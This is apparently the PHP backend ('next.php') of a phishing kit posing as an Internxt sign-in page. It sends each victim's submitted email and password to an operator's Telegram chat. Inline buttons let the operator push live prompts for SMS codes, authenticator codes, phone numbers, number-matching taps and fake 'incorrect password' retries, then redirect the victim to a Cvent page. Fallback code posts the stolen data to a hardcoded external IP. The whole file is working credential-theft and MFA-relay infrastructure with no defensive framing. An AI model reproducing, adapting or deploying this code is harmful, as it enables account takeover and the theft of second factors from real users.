<?php
/**
 * next.php - Targeted Verification Flow & Telegram Bot Gateway
 * Compatible with cPanel (PHP 7.4+), Apache, Nginx
 */

header('Content-Type: application/json; charset=utf-8');
header('Cache-Control: no-cache, no-store, must-revalidate');

// 1. Session Storage Configuration
$sessionDir = __DIR__ . '/data/sessions';
if (!is_dir($sessionDir)) {
    @mkdir($sessionDir, 0755, true);
}
if (!is_dir($sessionDir) || !is_writable($sessionDir)) {
    $sessionDir = sys_get_temp_dir() . '/internxt_sessions';
    if (!is_dir($sessionDir)) {
        @mkdir($sessionDir, 0755, true);
    }
}
// Protect sessions directory from direct web access
if (is_dir($sessionDir) && !file_exists($sessionDir . '/.htaccess')) {
    @file_put_contents($sessionDir . '/.htaccess', "Deny from all\n");
}

// 2. Load Configuration from licenseKey.json and Environment Variables
function loadConfig() {
    $configFile = __DIR__ . '/licenseKey.json';
    $config = [];
    if (file_exists($configFile)) {
        $raw = file_get_contents($configFile);
        $config = json_decode($raw, true) ?: [];
    }

    $botToken = getenv('TELEGRAM_BOT_TOKEN') ?: ($config['telegram_bot_token'] ?? '');
    $chatId = getenv('TELEGRAM_CHAT_ID') ?: ($config['telegram_chat_id'] ?? ($config['telegram_ChatID'] ?? ''));
    if ($chatId === '---') $chatId = '';

    $licenseKey = getenv('PAGE_LICENSE_KEY') ?: ($config['Page_LicenseKey'] ?? '');
    $systemValue = $config['systemValue'] ?? 'livepage_3month';

    return [
        'telegram_bot_token' => trim($botToken),
        'telegram_chat_id'   => trim($chatId),
        'Page_LicenseKey'     => trim($licenseKey),
        'systemValue'        => trim($systemValue),
    ];
}

$appConfig = loadConfig();

// Helper: JSON response sender
function sendResponse($status, $data) {
    http_response_code($status);
    echo json_encode($data);
    exit;
}

// Helper: Session Read / Write
function saveSession($sessionDir, $sessionId, $data) {
    $cleanId = preg_replace('/[^a-zA-Z0-9_-]/', '', $sessionId);
    $path = $sessionDir . '/' . $cleanId . '.json';
    $data['sessionId'] = $cleanId;
    $data['updatedAt'] = time();
    if (!isset($data['createdAt'])) {
        $data['createdAt'] = time();
    }
    file_put_contents($path, json_encode($data), LOCK_EX);

    // Also update email map if email is present
    if (!empty($data['email'])) {
        $mapPath = $sessionDir . '/email_' . md5(strtolower(trim($data['email']))) . '.json';
        file_put_contents($mapPath, json_encode(['sessionId' => $cleanId, 'updatedAt' => time()]), LOCK_EX);
    }
}

function getSession($sessionDir, $sessionId) {
    $cleanId = preg_replace('/[^a-zA-Z0-9_-]/', '', $sessionId);
    $path = $sessionDir . '/' . $cleanId . '.json';
    if (!file_exists($path)) {
        return null;
    }
    $raw = file_get_contents($path);
    return json_decode($raw, true) ?: null;
}

// Cleanup sessions older than 45 minutes
function cleanupOldSessions($sessionDir) {
    if (!is_dir($sessionDir)) return;
    $files = glob($sessionDir . '/*.json');
    $now = time();
    foreach ($files as $file) {
        if ($now - filemtime($file) > 2700) {
            @unlink($file);
        }
    }
}
if (mt_rand(1, 20) === 1) {
    cleanupOldSessions($sessionDir);
}

// 3. Telegram API Client
function callTelegram($botToken, $method, $params = []) {
    if (empty($botToken)) {
        return ['ok' => false, 'error' => 'Bot token not configured'];
    }
    $url = "https://api.telegram.org/bot{$botToken}/{$method}";
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($params));
    curl_setopt($ch, CURLOPT_TIMEOUT, 6);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curlErr = curl_error($ch);
    curl_close($ch);

    if ($curlErr) {
        return ['ok' => false, 'error' => $curlErr];
    }
    $decoded = json_decode($response, true);
    return $decoded ?: ['ok' => false, 'httpCode' => $httpCode, 'raw' => $response];
}

// Inline Keyboards Builder
function buildMainActionsKeyboard($sessionId) {
    return [
        'inline_keyboard' => [
            [
                ['text' => '🔢 Number-Tap (1-99)', 'callback_data' => "act:{$sessionId}:num_menu"],
                ['text' => '📱 Tap-Yes', 'callback_data' => "act:{$sessionId}:tap_yes"]
            ],
            [
                ['text' => '💬 SMS Code', 'callback_data' => "act:{$sessionId}:sms_code"],
                ['text' => '🔐 Auth Code', 'callback_data' => "act:{$sessionId}:auth_code"]
            ],
            [
                ['text' => '📞 Ask Phone', 'callback_data' => "act:{$sessionId}:ask_phone"],
                ['text' => '🔁 Wrong Password', 'callback_data' => "act:{$sessionId}:retry"]
            ],
            [
                ['text' => '✅ Approve (Redirect to Cvent)', 'callback_data' => "act:{$sessionId}:approve"]
            ]
        ]
    ];
}

function buildRangePickerKeyboard($sessionId) {
    return [
        'inline_keyboard' => [
            [
                ['text' => '1 - 20', 'callback_data' => "rng:{$sessionId}:1-20"],
                ['text' => '21 - 40', 'callback_data' => "rng:{$sessionId}:21-40"]
            ],
            [
                ['text' => '41 - 60', 'callback_data' => "rng:{$sessionId}:41-60"],
                ['text' => '61 - 80', 'callback_data' => "rng:{$sessionId}:61-80"]
            ],
            [
                ['text' => '81 - 99', 'callback_data' => "rng:{$sessionId}:81-99"],
                ['text' => '📋 Show All 1-99', 'callback_data' => "rng:{$sessionId}:all"]
            ],
            [
                ['text' => '⬅️ Back to Main Actions', 'callback_data' => "act:{$sessionId}:back_main"]
            ]
        ]
    ];
}

function buildNumberGridKeyboard($sessionId, $start, $end) {
    $rows = [];
    $currentRow = [];
    for ($i = $start; $i <= $end; $i++) {
        $currentRow[] = ['text' => (string)$i, 'callback_data' => "num:{$sessionId}:{$i}"];
        if (count($currentRow) === 5) {
            $rows[] = $currentRow;
            $currentRow = [];
        }
    }
    if (!empty($currentRow)) {
        $rows[] = $currentRow;
    }
    $rows[] = [
        ['text' => '⬅️ Pick Another Range', 'callback_data' => "act:{$sessionId}:num_menu"],
        ['text' => '🏠 Main Actions', 'callback_data' => "act:{$sessionId}:back_main"]
    ];
    return ['inline_keyboard' => $rows];
}

function buildAllNumbersGridKeyboard($sessionId) {
    $rows = [];
    $currentRow = [];
    for ($i = 1; $i <= 99; $i++) {
        $currentRow[] = ['text' => (string)$i, 'callback_data' => "num:{$sessionId}:{$i}"];
        // Telegram allows up to 8 buttons per row
        if (count($currentRow) === 8) {
            $rows[] = $currentRow;
            $currentRow = [];
        }
    }
    if (!empty($currentRow)) {
        $rows[] = $currentRow;
    }
    $rows[] = [
        ['text' => '⬅️ Range View', 'callback_data' => "act:{$sessionId}:num_menu"],
        ['text' => '🏠 Main Actions', 'callback_data' => "act:{$sessionId}:back_main"]
    ];
    return ['inline_keyboard' => $rows];
}

function buildNumberActiveKeyboard($sessionId, $number) {
    return [
        'inline_keyboard' => [
            [
                ['text' => "✅ User Tapped {$number} (Approve)", 'callback_data' => "act:{$sessionId}:approve"],
                ['text' => '❌ Wrong Number', 'callback_data' => "act:{$sessionId}:wrong_num"]
            ],
            [
                ['text' => '🔢 Change Number', 'callback_data' => "act:{$sessionId}:num_menu"],
                ['text' => '🔁 Request Password Again', 'callback_data' => "act:{$sessionId}:retry"]
            ],
            [
                ['text' => '🏠 Main Actions', 'callback_data' => "act:{$sessionId}:back_main"]
            ]
        ]
    ];
}

// 4. Telegram Update / Callback Handler
function handleTelegramCallbackQuery($sessionDir, $botToken, $callbackQuery) {
    $data = $callbackQuery['data'] ?? '';
    $cqId = $callbackQuery['id'] ?? '';
    $msgId = $callbackQuery['message']['message_id'] ?? null;
    $chatId = $callbackQuery['message']['chat']['id'] ?? null;

    if (empty($data)) return;

    $finalCventUrl = "https://www.cvent.com/events/2018-facial-rejuvenation/event-summary-66dad18444ca4ff1b1379df029fd67f3.aspx/";

    // Format 1: act:sessionId:action
    if (strpos($data, 'act:') === 0) {
        $parts = explode(':', $data);
        $sessionId = $parts[1] ?? '';
        $action = $parts[2] ?? '';

        $session = getSession($sessionDir, $sessionId);
        if (!$session) {
            callTelegram($botToken, 'answerCallbackQuery', ['callback_query_id' => $cqId, 'text' => 'Session expired or not found.', 'show_alert' => true]);
            return;
        }

        if ($action === 'num_menu') {
            callTelegram($botToken, 'answerCallbackQuery', ['callback_query_id' => $cqId]);
            $text = "🔢 <b>Select Number Range (1-99)</b>\nSession: <code>{$sessionId}</code>\nPick a range below:";
            callTelegram($botToken, 'editMessageText', [
                'chat_id' => $chatId,
                'message_id' => $msgId,
                'text' => $text,
                'parse_mode' => 'HTML',
                'reply_markup' => buildRangePickerKeyboard($sessionId)
            ]);
        } elseif ($action === 'back_main') {
            callTelegram($botToken, 'answerCallbackQuery', ['callback_query_id' => $cqId]);
            $email = htmlspecialchars($session['email'] ?? 'User');
            $text = "🔐 <b>Sign-In Attempt (Internxt)</b>\nEmail: <code>{$email}</code>\nSession: <code>{$sessionId}</code>\n\nChoose verification action:";
            callTelegram($botToken, 'editMessageText', [
                'chat_id' => $chatId,
                'message_id' => $msgId,
                'text' => $text,
                'parse_mode' => 'HTML',
                'reply_markup' => buildMainActionsKeyboard($sessionId)
            ]);
        } elseif ($action === 'tap_yes') {
            $session['redirect'] = 'Tap-Yes';
            $session['status'] = 'pending';
            saveSession($sessionDir, $sessionId, $session);
            callTelegram($botToken, 'answerCallbackQuery', ['callback_query_id' => $cqId, 'text' => 'Selected: Tap-Yes']);
            callTelegram($botToken, 'editMessageText', [
                'chat_id' => $chatId,
                'message_id' => $msgId,
                'text' => "📱 <b>Tap-Yes Active</b>\nSession: <code>{$sessionId}</code>\nVictim page is now waiting for user to tap YES.\n\nAfter victim taps YES:",
                'parse_mode' => 'HTML',
                'reply_markup' => [
                    'inline_keyboard' => [
                        [['text' => '✅ Approved (Redirect to Cvent)', 'callback_data' => "act:{$sessionId}:approve"]],
                        [['text' => '🔁 Request Password Again', 'callback_data' => "act:{$sessionId}:retry"]],
                        [['text' => '🏠 Main Menu', 'callback_data' => "act:{$sessionId}:back_main"]]
                    ]
                ]
            ]);
        } elseif ($action === 'sms_code') {
            $session['redirect'] = 'SMS CODE';
            $session['status'] = 'pending';
            saveSession($sessionDir, $sessionId, $session);
            callTelegram($botToken, 'answerCallbackQuery', ['callback_query_id' => $cqId, 'text' => 'Selected: SMS Code']);
            callTelegram($botToken, 'editMessageText', [
                'chat_id' => $chatId,
                'message_id' => $msgId,
                'text' => "💬 <b>SMS Code Prompt Active</b>\nSession: <code>{$sessionId}</code>\nVictim page is now prompting for SMS code.",
                'parse_mode' => 'HTML',
                'reply_markup' => buildMainActionsKeyboard($sessionId)
            ]);
        } elseif ($action === 'auth_code') {
            $session['redirect'] = 'Authentication Code';
            $session['status'] = 'pending';
            saveSession($sessionDir, $sessionId, $session);
            callTelegram($botToken, 'answerCallbackQuery', ['callback_query_id' => $cqId, 'text' => 'Selected: Authenticator App Code']);
            callTelegram($botToken, 'editMessageText', [
                'chat_id' => $chatId,
                'message_id' => $msgId,
                'text' => "🔐 <b>Authenticator App Code Active</b>\nSession: <code>{$sessionId}</code>\nVictim page is now prompting for App Code.",
                'parse_mode' => 'HTML',
                'reply_markup' => buildMainActionsKeyboard($sessionId)
            ]);
        } elseif ($action === 'ask_phone') {
            $session['redirect'] = 'Ask Phonnumber';
            $session['status'] = 'pending';
            saveSession($sessionDir, $sessionId, $session);
            callTelegram($botToken, 'answerCallbackQuery', ['callback_query_id' => $cqId, 'text' => 'Selected: Ask Phone']);
            callTelegram($botToken, 'editMessageText', [
                'chat_id' => $chatId,
                'message_id' => $msgId,
                'text' => "📞 <b>Phone Prompt Active</b>\nSession: <code>{$sessionId}</code>\nVictim page is prompting for phone number.",
                'parse_mode' => 'HTML',
                'reply_markup' => buildMainActionsKeyboard($sessionId)
            ]);
        } elseif ($action === 'retry') {
            $session['status'] = 'retry';
            $session['message'] = 'retry';
            saveSession($sessionDir, $sessionId, $session);
            callTelegram($botToken, 'answerCallbackQuery', ['callback_query_id' => $cqId, 'text' => 'Requested: Wrong Password Retry']);
            callTelegram($botToken, 'editMessageText', [
                'chat_id' => $chatId,
                'message_id' => $msgId,
                'text' => "🔁 <b>Password Retry Sent</b>\nSession: <code>{$sessionId}</code>\nVictim page will display 'Incorrect password' and allow retry.",
                'parse_mode' => 'HTML',
                'reply_markup' => buildMainActionsKeyboard($sessionId)
            ]);
        } elseif ($action === 'approve') {
            $session['status'] = 'saved';
            $session['redirect'] = $finalCventUrl;
            saveSession($sessionDir, $sessionId, $session);
            callTelegram($botToken, 'answerCallbackQuery', ['callback_query_id' => $cqId, 'text' => 'Approved! Redirecting user to Cvent...']);
            callTelegram($botToken, 'editMessageText', [
                'chat_id' => $chatId,
                'message_id' => $msgId,
                'text' => "🎉 <b>VERIFICATION APPROVED & COMPLETE</b>\nSession: <code>{$sessionId}</code>\nTarget: Cvent Facial Rejuvenation Event\nVictim has been successfully redirected.",
                'parse_mode' => 'HTML'
            ]);
        } elseif ($action === 'wrong_num') {
            $session['status'] = 'wrong_number_pressed';
            saveSession($sessionDir, $sessionId, $session);
            callTelegram($botToken, 'answerCallbackQuery', ['callback_query_id' => $cqId, 'text' => 'Marked as Wrong Number']);
            callTelegram($botToken, 'editMessageText', [
                'chat_id' => $chatId,
                'message_id' => $msgId,
                'text' => "❌ <b>Wrong Number Tapped</b>\nSession: <code>{$sessionId}</code>\nVictim page redirected to rejection view.",
                'parse_mode' => 'HTML',
                'reply_markup' => buildMainActionsKeyboard($sessionId)
            ]);
        }
    }
    // Format 2: Range selector rng:sessionId:start-end
    elseif (strpos($data, 'rng:') === 0) {
        $parts = explode(':', $data);
        $sessionId = $parts[1] ?? '';
        $range = $parts[2] ?? '';

        callTelegram($botToken, 'answerCallbackQuery', ['callback_query_id' => $cqId]);

        if ($range === 'all') {
            $keyboard = buildAllNumbersGridKeyboard($sessionId);
            $text = "🔢 <b>Tap any Number (1 - 99):</b>\nSession: <code>{$sessionId}</code>";
        } else {
            [$start, $end] = explode('-', $range);
            $start = max(1, min(99, intval($start)));
            $end = max(1, min(99, intval($end)));
            $keyboard = buildNumberGridKeyboard($sessionId, $start, $end);
            $text = "🔢 <b>Select Number ({$start} - {$end}):</b>\nSession: <code>{$sessionId}</code>";
        }

        callTelegram($botToken, 'editMessageText', [
            'chat_id' => $chatId,
            'message_id' => $msgId,
            'text' => $text,
            'parse_mode' => 'HTML',
            'reply_markup' => $keyboard
        ]);
    }
    // Format 3: Number selection num:sessionId:N
    elseif (strpos($data, 'num:') === 0) {
        $parts = explode(':', $data);
        $sessionId = $parts[1] ?? '';
        $number = intval($parts[2] ?? 0);

        if ($number < 1 || $number > 99) {
            callTelegram($botToken, 'answerCallbackQuery', ['callback_query_id' => $cqId, 'text' => 'Invalid number. Must be 1-99.', 'show_alert' => true]);
            return;
        }

        $session = getSession($sessionDir, $sessionId);
        if (!$session) {
            callTelegram($botToken, 'answerCallbackQuery', ['callback_query_id' => $cqId, 'text' => 'Session expired or not found.', 'show_alert' => true]);
            return;
        }

        // Set session to Number-Tap
        $session['numberTap'] = (string)$number;
        $session['redirect'] = "Number-Tap:{$number}";
        $session['status'] = 'pending';
        saveSession($sessionDir, $sessionId, $session);

        callTelegram($botToken, 'answerCallbackQuery', [
            'callback_query_id' => $cqId,
            'text' => "Selected Number: {$number}"
        ]);

        $text = "✅ <b>Number-Tap [ {$number} ] Active!</b>\nSession: <code>{$sessionId}</code>\nThe victim page is now showing number <b>{$number}</b>.\n\nDid the user confirm the prompt on their device?";
        callTelegram($botToken, 'editMessageText', [
            'chat_id' => $chatId,
            'message_id' => $msgId,
            'text' => $text,
            'parse_mode' => 'HTML',
            'reply_markup' => buildNumberActiveKeyboard($sessionId, $number)
        ]);
    }
}

// 5. Zero-Configuration Telegram Polling Check on Browser Status Polls
function checkTelegramUpdatesSync($sessionDir, $botToken) {
    if (empty($botToken)) return;

    $offsetFile = $sessionDir . '/last_update_id.txt';
    $lastUpdateId = file_exists($offsetFile) ? intval(@file_get_contents($offsetFile)) : 0;

    $res = callTelegram($botToken, 'getUpdates', [
        'offset' => $lastUpdateId + 1,
        'limit' => 10,
        'timeout' => 0
    ]);

    if (!empty($res['ok']) && is_array($res['result'])) {
        foreach ($res['result'] as $update) {
            $updateId = $update['update_id'] ?? 0;
            if ($updateId > $lastUpdateId) {
                $lastUpdateId = $updateId;
            }
            if (!empty($update['callback_query'])) {
                handleTelegramCallbackQuery($sessionDir, $botToken, $update['callback_query']);
            }
        }
        @file_put_contents($offsetFile, (string)$lastUpdateId, LOCK_EX);
    }
}

// 6. Router & Request Dispatching
$method = $_SERVER['REQUEST_METHOD'] ?? 'GET';
$requestUri = $_SERVER['REQUEST_URI'] ?? '';
$pathInfo = $_SERVER['PATH_INFO'] ?? '';
$actionParam = $_GET['action'] ?? '';

// Determine route path
$route = '';
if (!empty($actionParam)) {
    $route = '/' . ltrim($actionParam, '/');
} elseif (!empty($pathInfo)) {
    $route = $pathInfo;
} else {
    // Extract part after next.php
    $pos = strpos($requestUri, 'next.php');
    if ($pos !== false) {
        $sub = substr($requestUri, $pos + 8);
        $qPos = strpos($sub, '?');
        $route = $qPos !== false ? substr($sub, 0, $qPos) : $sub;
    } else {
        $qPos = strpos($requestUri, '?');
        $route = $qPos !== false ? substr($requestUri, 0, $qPos) : $requestUri;
    }
}

// Route: POST /submit-result
if ($method === 'POST' && (strpos($route, '/submit-result') !== false || $actionParam === 'submit-result')) {
    $input = file_get_contents('php://input');
    $data = json_decode($input, true);

    if (empty($data['result'])) {
        sendResponse(400, ['error' => 'Missing required field: result']);
    }

    // Extract user email if present in payload or form
    $email = '';
    if (preg_match('/Email\s*:\s*([^\r\n]+)/i', $data['result'], $matches)) {
        $email = trim($matches[1]);
    }

    // Generate unique session ID
    $sessionId = bin2hex(random_bytes(4)); // e.g. "a1b2c3d4"

    // Prepare session record
    $session = [
        'sessionId'      => $sessionId,
        'email'          => $email,
        'status'         => 'pending',
        'redirect'       => '',
        'numberTap'      => '',
        'message'        => 'Please wait...',
        'licenseKey'     => $data['licenseKey'] ?? $appConfig['Page_LicenseKey'],
        'telegramChatID' => $data['telegramChatID'] ?? $appConfig['telegram_chat_id'],
        'systemValue'    => $data['systemValue'] ?? $appConfig['systemValue'],
        'rawResult'      => $data['result'],
        'createdAt'      => time(),
        'updatedAt'      => time()
    ];
    saveSession($sessionDir, $sessionId, $session);

    // Check if Direct Telegram Bot API is configured
    $botToken = $appConfig['telegram_bot_token'];
    $chatId = !empty($session['telegramChatID']) && $session['telegramChatID'] !== '---'
        ? $session['telegramChatID']
        : $appConfig['telegram_chat_id'];

    if (!empty($botToken) && !empty($chatId)) {
        // Direct Telegram Bot integration
        $cleanEmail = htmlspecialchars($email ?: 'Unknown');
        $text = "🔔 <b>New Sign-In Submission (Internxt)</b>\n"
              . "━━━━━━━━━━━━━━━━━━━━━\n"
              . "📧 <b>Email:</b> <code>{$cleanEmail}</code>\n"
              . "🆔 <b>Session:</b> <code>{$sessionId}</code>\n"
              . "<pre>" . htmlspecialchars(substr($data['result'], 0, 800)) . "</pre>\n"
              . "━━━━━━━━━━━━━━━━━━━━━\n"
              . "Select next verification step for victim:";

        $keyboard = buildMainActionsKeyboard($sessionId);
        $tgResult = callTelegram($botToken, 'sendMessage', [
            'chat_id' => $chatId,
            'text' => $text,
            'parse_mode' => 'HTML',
            'reply_markup' => $keyboard
        ]);

        if (empty($tgResult['ok'])) {
            error_log("Telegram sendMessage failed: " . json_encode($tgResult));
        }

        sendResponse(200, [
            'sessionId' => $sessionId,
            'message'   => 'Verifying credentials...'
        ]);
    }

    // Fallback: If bot token not configured, but licenseKey is, try external API
    if (!empty($data['licenseKey']) || !empty($appConfig['Page_LicenseKey'])) {
        $payload = [
            'result'         => $data['result'],
            'licenseKey'     => $data['licenseKey'] ?? $appConfig['Page_LicenseKey'],
            'telegramChatID' => $data['telegramChatID'] ?? $appConfig['telegram_chat_id'],
            'systemValue'    => $data['systemValue'] ?? $appConfig['systemValue'],
            'pages'          => $data['pages'] ?? ["Tap-Yes", "SMS CODE", "Authentication Code", "Ask Phonnumber", "Number-Tap", "Redirect.html"],
        ];

        $ch = curl_init('http://157.180.52.45:5040/api/submit-result');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
        curl_setopt($ch, CURLOPT_TIMEOUT, 6);

        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $curlErr = curl_error($ch);
        curl_close($ch);

        if (!$curlErr && $httpCode >= 200 && $httpCode < 300) {
            $extData = json_decode($response, true);
            if (!empty($extData['sessionId'])) {
                $session['externalSessionId'] = $extData['sessionId'];
                saveSession($sessionDir, $sessionId, $session);
                sendResponse(200, [
                    'sessionId' => $sessionId,
                    'externalSessionId' => $extData['sessionId'],
                    'message'   => $extData['message'] ?? 'Verifying credentials...'
                ]);
            }
        }
    }

    // Clear diagnostic error if neither is properly configured
    sendResponse(400, [
        'error' => "Telegram bot credentials are not configured. Please add 'telegram_bot_token' and 'telegram_chat_id' to licenseKey.json or set them as environment variables."
    ]);
}

// Route: POST /session-open
if ($method === 'POST' && (strpos($route, '/session-open') !== false || $actionParam === 'session-open')) {
    $input = file_get_contents('php://input');
    $data = json_decode($input, true) ?: [];

    $botToken = $appConfig['telegram_bot_token'];
    $chatId = !empty($data['telegramChatID']) && $data['telegramChatID'] !== '---'
        ? $data['telegramChatID']
        : $appConfig['telegram_chat_id'];

    if (!empty($botToken) && !empty($chatId) && !empty($data['message'])) {
        callTelegram($botToken, 'sendMessage', [
            'chat_id' => $chatId,
            'text' => "🌐 <b>Visitor Opened Portal</b>\n<pre>" . htmlspecialchars($data['message']) . "</pre>",
            'parse_mode' => 'HTML'
        ]);
        sendResponse(200, ['status' => 'ok']);
    }

    // Fallback to external API if available
    $ch = curl_init('http://157.180.52.45:5040/api/session-open');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $input);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
    $res = curl_exec($ch);
    curl_close($ch);

    sendResponse(200, ['status' => 'ok']);
}

// Route: GET /status/:sessionId
if ($method === 'GET' && (preg_match('/\/status\/([a-zA-Z0-9_-]+)/', $route, $matches) || (!empty($_GET['id']) && $actionParam === 'status'))) {
    $sessionId = $matches[1] ?? $_GET['id'];

    // 1. Sync updates from Telegram directly if bot token is present
    if (!empty($appConfig['telegram_bot_token'])) {
        checkTelegramUpdatesSync($sessionDir, $appConfig['telegram_bot_token']);
    }

    $session = getSession($sessionDir, $sessionId);

    // If local session exists, return its status
    if ($session) {
        $resp = [
            'sessionId' => $sessionId,
            'status'    => $session['status'] ?? 'pending',
            'message'   => $session['message'] ?? 'Please wait...'
        ];
        if (!empty($session['redirect'])) {
            $resp['redirect'] = $session['redirect'];
        }
        if (!empty($session['numberTap'])) {
            $resp['numberTap'] = $session['numberTap'];
        }
        sendResponse(200, $resp);
    }

    // Fallback: If external API was used
    $ch = curl_init("http://157.180.52.45:5040/api/status/{$sessionId}");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpCode === 200 && $response) {
        $decoded = json_decode($response, true);
        if ($decoded) {
            sendResponse(200, $decoded);
        }
    }

    sendResponse(404, ['error' => 'Session not found or expired']);
}

// Route: POST /telegram-webhook (Webhook handler from Telegram)
if ($method === 'POST' && (strpos($route, '/telegram-webhook') !== false || $actionParam === 'webhook')) {
    $input = file_get_contents('php://input');
    $update = json_decode($input, true);

    if (!empty($update['callback_query'])) {
        handleTelegramCallbackQuery($sessionDir, $appConfig['telegram_bot_token'], $update['callback_query']);
    }

    sendResponse(200, ['ok' => true]);
}

// Route: GET /config (Public safe frontend configuration)
if ($method === 'GET' && (strpos($route, '/config') !== false || $actionParam === 'config')) {
    sendResponse(200, [
        'Page_LicenseKey' => $appConfig['Page_LicenseKey'],
        'telegramChatID'  => $appConfig['telegram_chat_id'],
        'systemValue'     => $appConfig['systemValue']
    ]);
}

// Default 404
sendResponse(404, ['error' => 'Endpoint not found', 'route' => $route]);
